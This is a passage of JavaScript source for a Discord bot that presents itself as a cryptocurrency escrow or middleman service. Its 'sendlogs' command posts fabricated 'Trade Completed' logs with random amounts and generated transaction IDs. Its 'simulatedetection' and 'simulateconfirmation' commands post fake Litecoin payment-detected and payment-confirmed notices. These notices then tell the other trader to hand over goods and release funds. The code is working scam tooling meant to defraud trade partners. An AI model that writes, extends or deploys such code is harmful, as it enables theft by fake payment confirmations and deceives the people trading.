      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      const user = interaction.options.getUser('user');
      const usd = interaction.options.getNumber('usd');
      const deals = interaction.options.getInteger('deals');
      if (!userStats[user.id]) userStats[user.id] = { usd: 0, deals: 0 };
      if (usd !== null) userStats[user.id].usd = usd;
      if (deals !== null) userStats[user.id].deals = deals;
      await updateRank(interaction.guild, user.id);
      await interaction.reply({ content: `Stats updated for ${user}!`, ephemeral: true });
    }
    if (interaction.commandName === 'stats') {
      if (interaction.channel.id !== cfg.STATS_CHANNEL_ID) return interaction.reply({ content: 'You can only use this command in the stats channel!', ephemeral: true });
      const target = interaction.options.getUser('user') || interaction.user;
      const stats = userStats[target.id] || { usd: 0, deals: 0 };
      const currentRank = getCurrentRank(stats.usd);
      const nextRank = getNextRank(stats.usd);
      const statsEmbed = new EmbedBuilder().setTitle(target.username).setThumbnail(target.displayAvatarURL()).addFields({ name: 'Current Rank:', value: currentRank ? `<@&${rankRoles[currentRank].roleId}> ($${rankRoles[currentRank].min.toLocaleString()})` : 'None' }, { name: 'Next Rank:', value: nextRank ? `<@&${rankRoles[nextRank].roleId}> ($${rankRoles[nextRank].min.toLocaleString()})` : 'Max Rank reached!' }, { name: 'Deals Completed', value: `${stats.deals}` }, { name: 'Total USD Value', value: `$${stats.usd.toLocaleString()}` }).setColor(0x2b2d31);
      await interaction.reply({ embeds: [statsEmbed] });
    }
    if (interaction.commandName === 'settoschannel') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.TOS_CHANNEL_ID = interaction.options.getString('channel_id');
      await saveConfig(guildId);
      await interaction.reply({ content: `TOS channel set to: ${cfg.TOS_CHANNEL_ID}`, ephemeral: true });
    }
    if (interaction.commandName === 'setsimulaterole') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.SIMULATE_ROLE_ID = interaction.options.getRole('role').id;
      await saveConfig(guildId);
      await interaction.reply({ content: `Simulate role set.`, ephemeral: true });
    }
    if (interaction.commandName === 'setowner') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      const user = interaction.options.getUser('user');
      if (!guildOwners[guildId]) guildOwners[guildId] = new Set();
      guildOwners[guildId].add(user.id);
      await saveOwners(guildId);
      await interaction.reply({ content: `${user} added as owner.`, ephemeral: true });
    }
    if (interaction.commandName === 'removeowner') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      const user = interaction.options.getUser('user');
      if (guildOwners[guildId]) guildOwners[guildId].delete(user.id);
      await saveOwners(guildId);
      await interaction.reply({ content: `${user} removed as owner.`, ephemeral: true });
    }
    if (interaction.commandName === 'sendlogs') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      const channel = interaction.options.getChannel('channel');
      await interaction.reply({ content: 'Log sent!', ephemeral: true });
      const scheduleLog = async () => {
        const delay = (Math.floor(Math.random() * 4.5) + 0.5) * 60 * 1000;
        setTimeout(async () => {
          const ltcPrice = await getLTCPrice();
          const isUSDT = Math.random() < 0.1;
          const randomAmount = (Math.random() * 200 + 1).toFixed(2);
          const randomLtc = (randomAmount / ltcPrice).toFixed(8);
          const randomTxid = generateTXID();
          const usdtTxid = '0x' + randomTxid.slice(0, 64);
          const autoEmbed = new EmbedBuilder().setTitle(isUSDT ? '<:usdt:1507676670654419064> • Trade Completed' : '<:LTC:1507672593145139230> • Trade Completed').setDescription(isUSDT ? `\`${parseFloat(randomAmount).toFixed(2)}\` **USDT** ($${(parseFloat(randomAmount) - 0.01).toFixed(2)} USD)\n\n**Sender**\n\`Anonymous\`\n**Receiver**\n\`Anonymous\`\n**Transaction ID**\n\`${formatTXID(usdtTxid)}\`` : `\`${randomLtc}\` **LTC** ($${randomAmount} USD)\n\n**Sender**\n\`Anonymous\`\n**Receiver**\n\`Anonymous\`\n**Transaction ID**\n\`${formatTXID(randomTxid)}\``).setColor(isUSDT ? 0x26a17b : 0xb9b9bb);
          await channel.send({ embeds: [autoEmbed] }).catch(() => {});
          scheduleLog();
        }, delay);
      };
      scheduleLog();
    }
    if (interaction.commandName === 'simulatedetection') {
      const member = await interaction.guild.members.fetch(interaction.user.id);
      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
      const amount = interaction.options.getNumber('amount');
      const ltcPrice = await getLTCPrice();
      const ltcAmount = (amount / ltcPrice).toFixed(8);
      const ticketId = interaction.channel.id;
      const ticket = tickets[ticketId];
      const txid = generateTXID();
      if (ticket) ticket.txid = txid;
      const detectionEmbed = new EmbedBuilder().setTitle('⚠️ • Transaction Detected').setDescription(`The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n[${formatTXID(txid)}](https://blockchair.com/litecoin/transaction/${txid}) (${ltcAmount} LTC)\n**Amount Received**\n\`${ltcAmount}\` LTC ($${amount.toFixed(2)})\n**Required Amount**\n\`${ltcAmount}\` LTC ($${amount.toFixed(2)})\n\nYou will be notified when the transaction is confirmed.`).setColor(0xffa500);
      await interaction.reply({ embeds: [detectionEmbed], ephemeral: true });
      await interaction.channel.send({ embeds: [detectionEmbed] });
    }
    if (interaction.commandName === 'simulateconfirmation') {
      const member = await interaction.guild.members.fetch(interaction.user.id);
      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
      const amount = interaction.options.getNumber('amount');
      const ltcPrice = await getLTCPrice();
      const ltcAmount = (amount / ltcPrice).toFixed(8);
      const ticketId = interaction.channel.id;
      const ticket = tickets[ticketId];
      const txid = ticket?.txid || generateTXID();
      const confirmedEmbed = new EmbedBuilder().setTitle('✅ • Transaction Confirmed!').setDescription(`**Transactions**\n[${formatTXID(txid)}](https://blockchair.com/litecoin/transaction/${txid}) (${ltcAmount} LTC)\n**Total Amount Received**\n\`${ltcAmount}\` LTC ($${amount.toFixed(2)})`).setColor(0x00aa00);
      await interaction.reply({ embeds: [confirmedEmbed], ephemeral: true });
      await interaction.channel.send({ embeds: [confirmedEmbed] });
      if (ticket) {
        const proceedEmbed = new EmbedBuilder().setTitle('✅ • You may proceed with your trade.').setDescription(`1. <@${ticket.receiver}> **Give your trader the items or payment you agreed on.**\n\n2. <@${ticket.sender}> **Once you have received your items, click "Release" so your trader can claim the LTC.**`).setColor(0x00aa00);
        const releaseBtn = new ButtonBuilder().setCustomId(`release_${ticketId}`).setLabel('Release').setStyle(ButtonStyle.Success);
        const cancelBtn = new ButtonBuilder().setCustomId(`cancel_${ticketId}`).setLabel('Cancel').setStyle(ButtonStyle.Secondary);
        const row = new ActionRowBuilder().addComponents(releaseBtn, cancelBtn);
        await interaction.channel.send({ content: `<@${ticket.trader1}> <@${ticket.trader2}>`, embeds: [proceedEmbed], components: [row] });
      }
    }
  } catch (e) {
    console.log('Interaction error:', e.message);
  }
});
 
client.login(process.env.TOKEN);
app.listen(3000, () => console.log('Server running'));
 
